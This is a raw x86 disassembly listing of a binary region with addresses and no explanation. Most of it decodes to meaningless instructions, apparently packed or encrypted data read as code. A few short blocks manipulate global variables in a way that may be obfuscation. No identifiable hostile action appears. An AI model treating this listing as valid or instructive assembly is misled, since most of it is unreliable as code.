  40615e:	outs   dx,BYTE PTR ds:[esi]
  40615f:	dec    edx
  406160:	xchg   ebx,eax
  406161:	xor    ecx,DWORD PTR [esi-0x173ede07]
  406167:	les    ecx,FWORD PTR [esp+ebp*8]
  40616a:	mov    ebx,0xd0059b5a
  40616f:	rdtsc  
  406171:	xchg   esi,eax
  406172:	test   DWORD PTR [edi+0x63],ebx
  406175:	cmp    DWORD PTR [ebx+esi*8+0x635615fa],0xffffff94
  40617d:	daa    
  40617e:	pop    ebp
  40617f:	mov    bh,0x2e
  406181:	icebp  
  406182:	out    dx,al
  406183:	ss out dx,al
  406185:	inc    esi
  406186:	arpl   WORD PTR [edx-0x8],di
  406189:	cmp    eax,0xa495a15a
  40618e:	lahf   
  40618f:	stc    
  406190:	add    al,0x31
  406192:	lods   al,BYTE PTR ds:[esi]
  406193:	cwde   
  406194:	push   ds
  406195:	loopne 0x4061b7
  406197:	cmp    DWORD PTR [edx],ebp
  406199:	dec    esi
  40619a:	push   cs
  40619b:	mov    ebx,DWORD PTR [edx+0x5ba844d1]
  4061a1:	retf   0x41c7
  4061a4:	(bad)  
  4061a6:	pop    ecx
  4061a7:	sahf   
  4061a8:	in     eax,dx
  4061a9:	icebp  
  4061aa:	pop    ss
  4061ab:	shl    BYTE PTR [ecx],0xb1
  4061ae:	outs   dx,BYTE PTR ds:[esi]
  4061af:	mov    bh,0xbd
  4061b1:	sti    
  4061b2:	aad    0xf8
  4061b4:	sbb    eax,0xbd7a8257
  4061b9:	sub    al,bl
  4061bb:	push   edi
  4061bc:	push   edx
  4061bd:	cdq    
  4061be:	inc    eax
  4061bf:	push   0x73bc77d
  4061c4:	mov    dl,0x1f
  4061c6:	sub    eax,0x7f9740ca
  4061cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061cc:	pmullw mm3,QWORD PTR [eax]
  4061cf:	rcr    DWORD PTR [ecx+0x3f61c4a4],0x4e
  4061d6:	jle    0x40621c
  4061d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061d9:	mov    ch,BYTE PTR [eax+esi*4+0x17]
  4061dd:	or     bh,bh
  4061df:	sub    eax,0xc47b7474
  4061e4:	mov    edi,0x6497dac1
  4061e9:	fcomp  st(7)
  4061eb:	dec    edx
  4061ec:	into   
  4061ed:	xchg   ebx,eax
  4061ee:	sar    DWORD PTR [eax],0xb0
  4061f1:	ins    BYTE PTR es:[edi],dx
  4061f2:	cmp    dl,dh
  4061f4:	mov    ds:0x865ce10d,eax
  4061f9:	or     al,0x46
  4061fb:	loopne 0x4061be
  4061fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061fe:	fistp  QWORD PTR [eax]
  406200:	js     0x40626a
  406202:	dec    eax
  406203:	clc    
  406204:	push   ss
  406205:	sub    BYTE PTR [ebp+0x7f],ah
  406208:	into   
  406209:	lahf   
  40620a:	sar    DWORD PTR ds:0x2b587f3b,1
  406210:	je     0x406204
  406212:	xchg   dl,bl
  406214:	mov    eax,0xa5c6d962
  406219:	xor    edi,DWORD PTR [ebx-0x7d]
  40621c:	dec    esi
  40621d:	add    eax,0x27e5ae6e
  406222:	jne    0x406212
  406224:	bound  edx,QWORD PTR [eax-0x112cf4f1]
  40622a:	jne    0x40621d
  40622c:	sbb    BYTE PTR [esi+0x46a4067a],bh
  406232:	mov    al,ds:0x2c685a61
  406237:	leave  
  406238:	pushf  
  406239:	or     eax,0x8a58eb88
  40623e:	ret    
  40623f:	aam    0x50
  406241:	sub    eax,0xbb2f66b3
  406246:	jp     0x4062bb
  406248:	je     0x40622e
  40624a:	pop    esi
  40624b:	in     eax,0x8a
  40624d:	shr    BYTE PTR [ecx],cl
  40624f:	retf   0xc54d
  406252:	scas   eax,DWORD PTR es:[edi]
  406253:	sub    eax,esp
  406255:	fisubr DWORD PTR [ecx]
  406257:	push   edi
  406258:	shl    DWORD PTR [ecx+eiz*4+0x4f],cl
  40625c:	dec    ebp
  40625d:	loope  0x406215
  40625f:	ss (bad) 
  406261:	push   edx
  406262:	mov    edx,0xd06fbe1
  406267:	in     al,dx
  406268:	je     0x40624c
  40626a:	cmp    al,0x23
  40626c:	mov    eax,ds:0x2a498c16
  406271:	addr16 enter 0x9c24,0x9
  406276:	push   ecx
  406277:	lods   eax,DWORD PTR ds:[esi]
  406278:	push   cs
  406279:	ficomp WORD PTR [edi+0x14]
  40627c:	cwde   
  40627d:	clc    
  40627e:	icebp  
  40627f:	popf   
  406280:	bndldx (bad),[ebp+0x4e]
  406284:	add    al,0xad
  406286:	or     eax,0xfa00ca3f
  40628b:	shr    DWORD PTR ds:0x2029f673,1
  406291:	push   ecx
  406292:	mov    al,ds:0x7932770
  406297:	push   ecx
  406298:	popf   
  406299:	(bad)  
  40629b:	fild   WORD PTR [edi-0x5eb20175]
  4062a1:	inc    cl
  4062a3:	mov    ebx,DWORD PTR [edi]
  4062a5:	xor    cl,bl
  4062a7:	dec    eax
  4062a8:	inc    edx
  4062a9:	adc    DWORD PTR [edx+0x56],ebp
  4062ac:	fs nop
  4062ae:	mov    dl,0xaa
  4062b0:	xchg   esi,eax
  4062b1:	test   eax,0x7d561975
  4062b6:	pushf  
  4062b7:	fst    QWORD PTR [esi-0x3e]
  4062ba:	lock mov ah,0xe1
  4062bd:	retf   0x2747
  4062c0:	mov    bl,BYTE PTR es:[edi-0x47]
  4062c4:	test   dh,al
  4062c6:	xchg   DWORD PTR [ebp+0x647a1683],ebp
  4062cc:	push   ds
  4062cd:	jns    0x4062d8
  4062cf:	push   ebx
  4062d0:	dec    esi
  4062d1:	fdiv   QWORD PTR [esi-0x72]
  4062d4:	and    BYTE PTR [edi+ecx*8],bh
  4062d7:	inc    ecx
  4062d8:	jge    0x406281
  4062da:	sub    DWORD PTR [edi+0xd],ecx
  4062dd:	iret   
  4062de:	outs   dx,DWORD PTR ds:[esi]
  4062df:	sub    BYTE PTR ds:0xedc75ef6,bh
  4062e5:	arpl   si,di
  4062e7:	scas   eax,DWORD PTR es:[edi]
  4062e8:	add    eax,0xae9e690f
  4062ed:	out    dx,al
  4062ee:	inc    ebx
  4062ef:	cmp    BYTE PTR [ebx+0x57],al
  4062f2:	es in  eax,dx
  4062f4:	push   eax
  4062f5:	ja     0x406354
  4062f7:	adc    al,0x7d
  4062f9:	pop    ebp
  4062fa:	aad    0x53
  4062fc:	push   edi
  4062fd:	pusha  
  4062fe:	clc    
  4062ff:	and    DWORD PTR [edi+0x4b593b63],eax
  406305:	cmp    dl,BYTE PTR [ebp-0x571b8848]
  40630b:	dec    ebp
  40630c:	mov    edi,0x70e6d4bf
  406311:	arpl   WORD PTR [ebp+0x35],bx
  406314:	mov    ah,0x78
  406316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406317:	push   ebp
  406318:	cmp    DWORD PTR ds:0x476a2957,ebx
  40631e:	mov    eax,ds:0xa18f0ffb
  406323:	or     ebx,DWORD PTR [edi+0x315b0d4f]
  406329:	ficomp DWORD PTR [ebx-0x528a438f]
  40632f:	mov    DWORD PTR [ecx-0x6889ce7b],esp
  406335:	push   esp
  406336:	test   ecx,edx
  406338:	dec    eax
  406339:	ror    cl,cl
  40633b:	and    esi,DWORD PTR [ebp-0x35]
  40633e:	mov    ch,0x57
  406340:	mov    ecx,0x91053f5c
  406345:	push   ds
  406346:	(bad)  [ebx-0x7c3fb594]
  40634c:	fld    DWORD PTR [esi-0x55]
  40634f:	aas    
  406350:	pushf  
  406351:	adc    ch,cl
  406353:	or     dl,BYTE PTR [edi+esi*8+0x2f]
  406357:	push   ebp
  406358:	mov    cl,0xe3
  40635a:	jae    0x406375
  40635c:	pop    ebp
  40635d:	(bad)  
  40635e:	push   edx
  40635f:	repz shl BYTE PTR [edx-0x7fe524e3],1
  406366:	(bad)  
  406367:	cmp    ebx,DWORD PTR [ecx+0x7c]
  40636a:	xor    ebp,DWORD PTR [edx+0xc]
  40636d:	cmp    eax,0x9ed60f39
  406372:	push   esp
  406373:	and    DWORD PTR [ebp-0x21d279c7],esp
  406379:	xlat   BYTE PTR ds:[ebx]
  40637a:	push   ebx
  40637b:	sbb    BYTE PTR [edi],cl
  40637d:	adc    dl,ch
  40637f:	push   esp
  406380:	and    al,0xee
  406382:	fst    DWORD PTR [esi+ebx*2+0x65e3333]
  406389:	cmp    al,0x79
  40638b:	cmp    ah,bh
  40638d:	dec    ebp
  40638e:	jne    0x406373
  406390:	cwde   
  406391:	mov    ah,0x3f
  406393:	nop
  406394:	retf   0x9850
  406397:	test   edx,0xb8dece3f
  40639d:	stos   DWORD PTR es:[edi],eax
  40639e:	(bad)  
  40639f:	js     0x4063b5
  4063a1:	push   ebp
  4063a2:	test   eax,0x48aea0bd
  4063a7:	icebp  
  4063a8:	push   0xffffffbf
  4063aa:	push   eax
  4063ab:	mov    DWORD PTR [ebx-0x124f02f8],esp
  4063b1:	outs   dx,DWORD PTR ds:[esi]
  4063b2:	cmp    bh,ch
  4063b4:	loopne 0x406399
  4063b6:	xchg   esi,eax
  4063b7:	xchg   esp,eax
  4063b8:	push   ecx
  4063b9:	adc    edx,DWORD PTR [edx-0x52f3ed9e]
  4063bf:	mov    dl,0x23
  4063c1:	pushf  
  4063c2:	inc    ecx
  4063c3:	repz arpl bp,di
  4063c6:	(bad)  
  4063c7:	je     0x40634f
  4063c9:	into   
  4063ca:	cmp    dl,BYTE PTR [edi]
  4063cc:	jl     0x40638d
  4063ce:	xchg   edx,eax
  4063cf:	icebp  
  4063d0:	xchg   ebp,ecx
  4063d2:	lods   eax,DWORD PTR ds:[esi]
  4063d3:	cli    
  4063d4:	or     eax,0xb6a514b3
  4063d9:	mov    dl,0x15
  4063db:	dec    eax
  4063dc:	fnsave [ebp-0x47]
  4063df:	mov    edx,0xd327d27b
  4063e4:	clc    
  4063e5:	or     BYTE PTR [ebp+0x2a5003b6],bl
  4063eb:	mov    ecx,0x375c161a
  4063f0:	int3   
  4063f1:	fisubr DWORD PTR [ebx]
  4063f3:	adc    al,0x20
  4063f5:	scas   al,BYTE PTR es:[edi]
  4063f6:	es in  al,dx
  4063f8:	retf   0x2fc4
  4063fb:	xchg   esi,eax
  4063fc:	sbb    BYTE PTR [esi],al
  4063fe:	xchg   DWORD PTR [edx+0x2b2728f9],edx
  406404:	imul   eax,DWORD PTR [ecx],0xb10016e0
  40640a:	retf   0x2de2
  40640d:	jg     0x406452
  40640f:	pop    esi
  406410:	and    esp,DWORD PTR fs:[edx+0x3320dca4]
  406417:	cmp    ebp,edx
  406419:	es inc edi
  40641b:	clc    
  40641c:	pusha  
  40641d:	pop    ss
  40641e:	mov    eax,0x860ff371
  406423:	push   edi
  406425:	(bad)  
  406426:	call   FWORD PTR [ebx-0x48]
  406429:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40642f:	leave  
  406430:	ret    0xc
  406433:	push   ebp
  406434:	mov    ebp,esp
  406436:	mov    eax,ds:0x41222c
  40643b:	add    DWORD PTR ds:0x430486,edi
  406441:	mov    edx,0x32729d
  406446:	xor    ecx,DWORD PTR ds:0x42e762
  40644c:	sub    eax,edx
  40644e:	inc    DWORD PTR ds:0x430492
  406454:	mov    ecx,0x7510856
  406459:	push   esi
  40645a:	sbb    DWORD PTR ds:0x4304b2,0x57eb
  406464:	mov    esi,DWORD PTR [ebp+0xc]
  406467:	xor    eax,ecx
  406469:	mov    DWORD PTR ds:0x42ee0c,0x533d
  406473:	cmp    eax,esi
  406475:	mov    DWORD PTR ds:0x42e762,0x3465
  40647f:	je     0x406fac
  406485:	mov    eax,ds:0x412224
  40648a:	dec    DWORD PTR ds:0x42e75a
  406490:	jmp    0x40681a
  406495:	fcmovnb st,st(7)
  406497:	dec    esi
  406498:	fild   WORD PTR [edx+0x57]
  40649b:	jnp    0x406498
  40649d:	(bad)  
  40649e:	cmp    ebx,DWORD PTR [esi*8-0x153363ac]
  4064a5:	fidiv  WORD PTR [ebx]
  4064a7:	jle    0x406527
  4064a9:	jmp    0x40651c
  4064ab:	jle    0x40652b
  4064ad:	sub    eax,0x7565fcb5
  4064b2:	mov    eax,0x7c1c6977
  4064b7:	pushf  
  4064b8:	(bad)  
  4064b9:	into   
  4064ba:	dec    edx
  4064bb:	shl    esi,0x13
  4064be:	jmp    0x61da:0xa284d05b
  4064c5:	nop
  4064c6:	pop    ebp
  4064c7:	out    dx,eax
  4064c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064c9:	sbb    DWORD PTR [eax-0x4a],eax
  4064cc:	lea    ecx,ds:0x85b9ed72
  4064d2:	mov    ah,0x27
  4064d4:	dec    ecx
  4064d5:	ret    0xc438
  4064d8:	ds sti 
  4064da:	mov    al,ds:0x3b02a9f9
  4064df:	or     DWORD PTR [edi],ebp
  4064e1:	xchg   esp,eax
  4064e2:	jne    0x406495
  4064e4:	push   edx
  4064e5:	or     ebp,DWORD PTR [eax-0x7b]
  4064e8:	stos   BYTE PTR es:[edi],al
  4064e9:	xchg   BYTE PTR [eax+eiz*2+0x7d],bh
  4064ed:	mov    cl,0xfc
  4064ef:	test   DWORD PTR [esi],ebx
  4064f1:	mov    eax,0xa5ba72ee
  4064f6:	shr    DWORD PTR [eax],0xca
  4064f9:	mov    ah,0xe0
  4064fb:	mov    esi,0x7b5eee68
  406500:	sub    al,0x19
  406502:	xchg   ebp,eax
  406503:	mov    BYTE PTR [ecx+0x13f92f6],al
  406509:	adc    al,BYTE PTR [edx+0x2a9a37cb]
  40650f:	cmp    eax,0x49091a2a
  406514:	push   ss
  406515:	mov    esp,0x371efedc
  40651a:	push   eax
  40651b:	cmp    al,0xb1
  40651d:	sub    BYTE PTR [ebp-0x29],0xb8
  406521:	adc    BYTE PTR [ebp-0x55],dl
  406524:	or     al,0x82
  406526:	add    BYTE PTR [eax],ch
  406528:	push   ecx
  406529:	(bad)  
  40652a:	jmp    0x7d700870
  40652f:	adc    BYTE PTR [eax],dh
  406531:	mov    al,ds:0xad8d181b
  406536:	sub    al,0x40
  406538:	lock clc 
  40653a:	aad    0x1
  40653c:	mov    al,0x1c
  40653e:	sbb    DWORD PTR [esi-0x4b],ebx
  406541:	ss mov cl,0x5d
  406544:	jmp    0x74cd1ec7
  406549:	cmp    al,0xc
  40654b:	push   es
  40654c:	mov    eax,ds:0x3416fb0a
  406551:	mov    edx,?
  406553:	ins    DWORD PTR es:[edi],dx
  406554:	pop    ecx
  406555:	das    
  406556:	push   ds
  406557:	and    ch,cl
  406559:	dec    ebx
  40655a:	dec    edi
  40655b:	jns    0x406584
  40655d:	fsub   DWORD PTR [edx]
  40655f:	and    al,0xcd
  406561:	mov    esi,DWORD PTR [edi-0x5d635052]
  406567:	rol    DWORD PTR [eax+0x3a],cl
  40656a:	pop    esi
  40656b:	sbb    eax,0x7687f137
  406570:	jle    0x406528
  406572:	outs   dx,BYTE PTR ds:[esi]
  406573:	int    0x7f
  406575:	stos   BYTE PTR es:[edi],al
  406576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406577:	dec    edi
  406578:	fnstenv [ebp+0x4b]
  40657b:	jb     0x406545
  40657d:	sbb    ah,BYTE PTR [ecx-0x4e]
  406580:	ss sub eax,0x5d339e27
  406586:	(bad)  
  406587:	push   esi
  406588:	adc    DWORD PTR [ebx+0x934cff8],ebp
  40658e:	jmp    0x4065f5
  406590:	dec    edx
  406591:	dec    ebp
  406592:	push   esi
  406593:	cmp    al,0xdd
  406595:	lds    esi,FWORD PTR [esi-0x65]
  406598:	push   edi
  406599:	stos   DWORD PTR es:[edi],eax
  40659a:	cmc    
  40659b:	test   DWORD PTR [edx+0x205a74ff],esp
  4065a1:	mov    esp,0xf4daa78c
  4065a6:	and    DWORD PTR [ebx],edx
  4065a8:	push   ds
  4065a9:	inc    ebp
  4065aa:	cmp    al,0x82
  4065ac:	xor    DWORD PTR [eax-0x7],edi
  4065af:	pop    es
  4065b0:	dec    ebp
  4065b1:	mov    ecx,0x4777eeb2
  4065b6:	dec    ecx
  4065b7:	call   0xd0e937d9
  4065bc:	jbe    0x4065e5
  4065be:	dec    ebx
  4065bf:	add    edx,ebx
  4065c1:	cwde   
  4065c2:	xor    dl,al
  4065c4:	mov    ss,ebp
  4065c6:	sub    DWORD PTR [edi+0x27],ebp
  4065c9:	xor    eax,edi
  4065cb:	and    edx,DWORD PTR [edi+0x25]
  4065ce:	mov    DWORD PTR [ecx+ebx*1],edi
  4065d1:	xchg   ebp,eax
  4065d2:	into   
  4065d3:	cli    
  4065d4:	in     al,0xbd
  4065d6:	push   ds
  4065d7:	test   ax,0x771c
  4065db:	aas    
  4065dc:	cmp    al,0x2a
  4065de:	add    BYTE PTR [ecx-0x43],dl
  4065e1:	add    eax,DWORD PTR [edx-0x77]
  4065e4:	mov    esi,0xdfac7dee
  4065e9:	jo     0x406597
  4065eb:	outs   dx,DWORD PTR ds:[esi]
  4065ec:	jl     0x406614
  4065ee:	pop    es
  4065ef:	xor    ah,BYTE PTR [edx-0x1888bf52]
  4065f5:	sub    BYTE PTR [esi-0x7790bc34],bh
  4065fb:	mov    ah,0x33
  4065fd:	es cdq 
  4065ff:	dec    esi
  406600:	scas   al,BYTE PTR es:[edi]
  406601:	dec    esp
  406602:	cdq    
  406603:	in     al,0x4a
  406605:	(bad)  
  406607:	adc    edx,DWORD PTR [ebx]
  406609:	and    bl,BYTE PTR [bx+di+0x2f]
  40660d:	leave  
  40660e:	mov    esp,0x8a838482
  406613:	jb     0x40663c
  406615:	lods   eax,DWORD PTR ds:[esi]
  406616:	test   ah,bh
  406618:	icebp  
  406619:	stc    
  40661a:	mov    bx,0x387a
  40661e:	mov    ds,WORD PTR [ebx]
  406620:	sbb    ch,BYTE PTR [esi-0x36]
  406623:	daa    
  406624:	dec    ecx
  406625:	sub    esp,DWORD PTR [edi+0x48]
  406628:	cld    
  406629:	add    ah,bh
  40662b:	lock xchg edi,eax
  40662d:	push   edi
  40662e:	idiv   BYTE PTR ds:0x3df56a63
  406634:	sub    eax,DWORD PTR ds:[edi]
  406637:	scas   al,BYTE PTR es:[edi]
  406638:	pop    edi
  406639:	or     bh,BYTE PTR [esi+0x567c089c]
  40663f:	pop    ds
  406640:	ror    BYTE PTR [ecx+0x40],0x77
  406644:	aaa    
  406645:	call   0xd28ab480
  40664a:	cdq    
  40664b:	pop    ds
  40664c:	pop    es
  40664d:	ss push edi
  40664f:	ja     0x406604
  406651:	mov    ch,BYTE PTR [edi-0xcbb2866]
  406657:	adc    eax,0x584f2b8b
  40665c:	int    0xb2
  40665e:	inc    ebx
  40665f:	dec    esp
  406660:	jmp    0x40665c
  406662:	fbstp  TBYTE PTR [ebx]
  406664:	jo     0x406623
  406666:	stc    
  406667:	loop   0x4066b6
  406669:	add    al,0x7
  40666b:	aam    0xde
  40666d:	pusha  
  40666e:	faddp  st(0),st
  406670:	add    al,0xeb
  406672:	xlat   BYTE PTR ds:[ebx]
  406673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406674:	repz arpl WORD PTR ds:0xd129b1f1,dx
  40667b:	mov    ds:0x9fd9dc47,al
  406680:	mov    ebx,0x15e12ef
  406685:	and    ebp,edi
  406687:	rcl    esp,1
  406689:	adc    eax,0x82b89f59
  40668e:	scas   al,BYTE PTR es:[edi]
  40668f:	daa    
  406690:	inc    edi
  406691:	push   edi
  406692:	pop    edx
  406693:	inc    eax
  406694:	xchg   al,dh
  406696:	aad    0xb
  406698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406699:	mov    ch,0x6
  40669b:	sub    al,0x37
  40669d:	cmp    DWORD PTR [edi],esi
  40669f:	int3   
  4066a0:	pop    es
  4066a1:	or     eax,0x63657e6e
  4066a6:	push   ebp
  4066a7:	repnz push edx
  4066a9:	push   esi
  4066aa:	bound  ecx,QWORD PTR [edi+ebp*4+0x413ed41d]
  4066b1:	add    al,0xe
  4066b3:	fsub   st(7),st
  4066b5:	call   0x1730a5ec
  4066ba:	in     eax,dx
  4066bb:	sub    eax,0xbe3228b4
  4066c0:	stc    
  4066c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066c2:	jge    0x406732
  4066c4:	push   ebp
  4066c5:	loopne 0x406745
  4066c7:	mov    al,bh
  4066c9:	imul   esp,DWORD PTR [ebx+0x69ed5bd1],0x74
  4066d0:	sbb    edx,ebp
  4066d2:	loop   0x406734
  4066d4:	jg     0x406745
  4066d6:	loope  0x40668c
  4066d8:	cmp    al,0xe1
  4066da:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4066dc:	xchg   esp,eax
  4066dd:	nop
  4066de:	jp     0x4066e2
  4066e0:	not    DWORD PTR [ebx+0x67]
  4066e3:	and    al,0x27
  4066e5:	arpl   WORD PTR [ecx+0x52],cx
  4066e8:	xchg   DWORD PTR [esi+esi*4+0x3c642575],edx
  4066ef:	icebp  
  4066f0:	push   eax
  4066f1:	je     0x40675f
  4066f3:	sub    dh,bl
  4066f5:	xchg   DWORD PTR [ecx-0x6d],edi
  4066f8:	inc    ebp
  4066f9:	outs   dx,DWORD PTR ds:[esi]
  4066fa:	xchg   ebp,eax
  4066fb:	sub    cl,BYTE PTR [esi-0x525c333c]
  406701:	fld    DWORD PTR [ebx+0x24]
  406704:	mov    esi,0x4b3928c4
  406709:	jb     0x406701
  40670b:	jl     0x4066b9
  40670d:	fsubr  DWORD PTR [ebx+0x40]
  406710:	jmp    0x406787
  406712:	pop    ss
  406713:	mov    esi,eax
  406715:	outs   dx,DWORD PTR ds:[esi]
  406716:	dec    esp
  406717:	mov    edx,0xa416d7cf
  40671c:	ja     0x40678e
  40671e:	sub    eax,0xf3f155d7
  406723:	sbb    eax,0xef74f073
  406728:	pop    eax
  406729:	pop    esi
  40672a:	enter  0x9820,0x66
  40672e:	jg     0x406755
  406730:	mov    bl,0xfb
  406732:	loope  0x4067ac
  406734:	jl     0x406715
  406736:	jmp    0x406781
  406738:	test   al,0xd
  40673a:	test   al,0x85
  40673c:	cdq    
  40673d:	ret    0x7aab
  406740:	int3   
  406741:	xor    BYTE PTR [edi-0x76],bh
  406744:	push   ecx
  406745:	jns    0x4066f9
  406747:	cs or  eax,0xd83aa656
  40674d:	ret    0xf00f
  406750:	pop    ss
  406751:	sahf   
  406752:	mov    cl,0xdd
  406754:	mov    edi,edx
  406756:	mov    dh,0xe6
  406758:	test   al,0x8c
  40675a:	lods   eax,DWORD PTR ds:[esi]
  40675b:	mov    ds:0x9b00d474,eax
  406760:	outs   dx,BYTE PTR ds:[esi]
  406761:	add    esi,esi
  406763:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  406765:	ret    
  406766:	jmp    0x406798
  406768:	add    al,0xbc
  40676a:	adc    al,0x5a
  40676c:	mov    dl,0xbf
  40676e:	mov    eax,ds:0xd3971692
  406773:	addr16 inc esi
  406775:	in     eax,dx
  406776:	pusha  
  406777:	lds    ebp,FWORD PTR [ebx+0x2158a9d]
  40677d:	pop    edx
  40677e:	xor    DWORD PTR [eax-0x37e055a1],eax
  406784:	shl    DWORD PTR [ebx-0x4f],cl
  406787:	aaa    
  406788:	test   eax,0x7fa52c67
  40678d:	icebp  
  40678e:	push   esi
  40678f:	out    dx,eax
  406790:	es fucom st(5)
  406793:	cmc    
  406794:	inc    ebp
  406795:	clc    
  406796:	sub    al,0xa3
  406798:	retf   0x764e
  40679b:	mov    dl,0x8f
  40679d:	sub    edi,esi
  40679f:	mov    ds:0x82b480e1,eax
  4067a4:	sbb    DWORD PTR [edx],ebx
  4067a6:	pop    esi
  4067a7:	dec    eax
  4067a8:	adc    edi,DWORD PTR [ebx-0x3e901134]
  4067ae:	cmp    DWORD PTR [eax-0x226f26d],esp
  4067b4:	nop
  4067b5:	test   al,0x9
  4067b7:	shl    BYTE PTR [edi],cl
  4067b9:	pop    ebx
  4067ba:	enter  0x9e99,0xdb
  4067be:	add    ebp,ecx
  4067c0:	xacquire xchg BYTE PTR [esi],ch
  4067c3:	arpl   WORD PTR [esi-0x35a2e994],si
  4067c9:	xchg   esi,eax
  4067ca:	cdq    
  4067cb:	jmp    0x4aea:0xe5686d41
  4067d2:	and    BYTE PTR [ebx+0x2f3d59c],ch
  4067d8:	ins    BYTE PTR es:[edi],dx
  4067d9:	push   edx
  4067da:	mov    BYTE PTR [edx+0x1d],al
  4067dd:	xchg   edi,eax
  4067de:	(bad)  
  4067e0:	push   cs
  4067e1:	fs inc ecx
  4067e3:	sbb    al,0xed
  4067e5:	test   DWORD PTR ds:[ecx+0x9],0x608d3994
  4067ed:	leave  
  4067ee:	cli    
  4067ef:	sbb    BYTE PTR [edi-0x4b7e4489],bh
  4067f5:	push   ebx
  4067f6:	jbe    0x4067c8
  4067f8:	cmp    DWORD PTR [ecx+0x24],ebp
  4067fb:	inc    edi
  4067fc:	or     eax,0x2cb7cd1
  406801:	jo     0x4067bb
  406803:	cld    
  406804:	cmp    BYTE PTR [edx],ah
  406806:	or     bh,0x1f
  406809:	pop    ebp
  40680a:	inc    edi
  40680b:	cs ds icebp 
  40680e:	xchg   esp,eax
  40680f:	aas    
  406810:	pop    eax
  406811:	popa   
  406812:	js     0x40680d
  406814:	dec    ebp
  406815:	xchg   DWORD PTR [ecx],edx
  406817:	jge    0x40681c
  406819:	sbb    BYTE PTR [ebx+0x1d810c75],cl
  40681f:	and    al,0xee
  406821:	inc    edx
  406822:	add    BYTE PTR [edx+0x2b004304],ch
  406828:	ret    0xc133
  40682b:	mov    DWORD PTR ds:0x430552,0x4727
  406835:	cmp    eax,esi
  406837:	mov    DWORD PTR ds:0x42ee1c,0x846
  406841:	jne    0x406867
  406847:	add    eax,DWORD PTR ds:0x43053e
  40684d:	mov    eax,ds:0x41222c
  406852:	add    eax,DWORD PTR ds:0x412224
  406858:	mov    DWORD PTR ds:0x4304ba,0x6a19
  406862:	jmp    0x406878
  406867:	mov    eax,DWORD PTR [ebp+0xc]
  40686a:	xor    DWORD PTR ds:0x430556,0x43049a
  406874:	xor    eax,ecx
  406876:	add    eax,edx
  406878:	mov    DWORD PTR ds:0x42ee24,0x1bc3
  406882:	jmp    0x406c0c
  406887:	xchg   BYTE PTR [ecx],dh
  406889:	fcmove st,st(5)
  40688b:	pop    ebp
  40688c:	fstp   QWORD PTR [ecx-0x3833e0bb]
  406892:	dec    esi
  406893:	sbb    al,0x78
  406895:	std    
  406896:	ror    BYTE PTR [ebx+0x36],0x7e
  40689a:	jle    0x406887
  40689c:	jno    0x40691c
  40689e:	jle    0x406824
  4068a0:	add    DWORD PTR [edx],edx
  4068a2:	(bad)  
  4068a3:	popa   
  4068a4:	lea    esi,[esi+0x328d8432]
  4068aa:	xor    al,0x4e
  4068ac:	popa   
  4068ad:	div    DWORD PTR [ebx+0x13bb05d2]
  4068b3:	xor    eax,0x3be5c6f4
  4068b8:	frstor [edx-0xf]
  4068bb:	inc    ebp
  4068bc:	mov    ds:0x31c0c68f,al
  4068c1:	pop    eax
  4068c2:	mov    bl,al
  4068c4:	add    bh,BYTE PTR [ebx+eax*2+0x50]
  4068c8:	mov    edx,0x208f9d06
  4068cd:	pop    ecx
  4068ce:	xchg   esp,eax
  4068cf:	int3   
  4068d0:	xchg   ebp,eax
  4068d1:	jns    0x4068ff
  4068d3:	mov    al,0x31
  4068d5:	out    0x1,eax
  4068d7:	outs   dx,DWORD PTR ds:[esi]
  4068d8:	popa   
  4068d9:	(bad)  
  4068db:	imul   esi,DWORD PTR [edx+0x23c0f5d8],0xf1861796
  4068e5:	repnz sub al,0x75
  4068e8:	fmul   QWORD PTR [edi]
  4068ea:	clc    
  4068eb:	push   es
  4068ec:	and    esp,DWORD PTR [esi+0x58]
  4068ef:	out    0x5a,al
  4068f1:	jl     0x4068c6
  4068f3:	fcmovbe st,st(5)
  4068f5:	mov    ebp,0x4d527d32
  4068fa:	mov    bh,BYTE PTR [esi]
  4068fc:	cmp    al,BYTE PTR [edx-0x54]
  4068ff:	push   ebx
  406900:	sub    esp,DWORD PTR es:[ebp+0x6b]
  406904:	(bad)  
  406905:	mov    es,WORD PTR ds:0xe7e0f2d0
  40690b:	cmp    eax,0xedfd49a5
  406910:	lods   al,BYTE PTR ds:[esi]
  406911:	repz jg 0x406938
  406914:	jnp    0x4068d8
  406916:	push   DWORD PTR [ebp-0xa]
  406919:	fs cdq 
  40691b:	repz in al,0xa8
  40691e:	push   0x12
  406920:	lahf   
  406921:	sub    al,0x28
  406923:	ffree  st(3)
  406925:	cdq    
  406926:	icebp  
  406927:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406928:	fdivp  st(1),st
  40692a:	div    BYTE PTR fs:[ecx+0x22]
  40692e:	out    0x8,eax
  406930:	inc    ecx
  406931:	cmp    cl,BYTE PTR [ebx-0x43ef5957]
  406937:	pop    esi
  406938:	adc    al,0x73
  40693a:	retf   0x9cfe
  40693d:	sub    BYTE PTR [esi-0x80],cl
  406940:	sub    al,0x23
  406942:	mov    ah,0xe8
  406944:	fs inc ebp
  406946:	xchg   ebx,eax
  406947:	adc    edx,DWORD PTR [ebx-0x1578a144]
  40694d:	cld    
  40694e:	ja     0x40698f
  406950:	into   
  406951:	mov    ecx,0x193c9392
  406956:	data16 adc al,0x8e
  406959:	inc    esp
  40695a:	sahf   
  40695b:	jno    0x406943
  40695d:	loope  0x40695d
  40695f:	fstp   QWORD PTR [ecx-0x5aa87da2]
  406965:	scas   al,BYTE PTR es:[edi]
  406966:	or     dl,bl
  406968:	dec    esi
  406969:	mov    dl,0xca
  40696b:	push   edx
  40696c:	lahf   
  40696d:	(bad)  
  40696e:	and    bl,dh
  406970:	xor    edx,DWORD PTR [ecx-0x77]
  406973:	jle    0x40691e
  406975:	lahf   
  406976:	cs xchg esi,eax
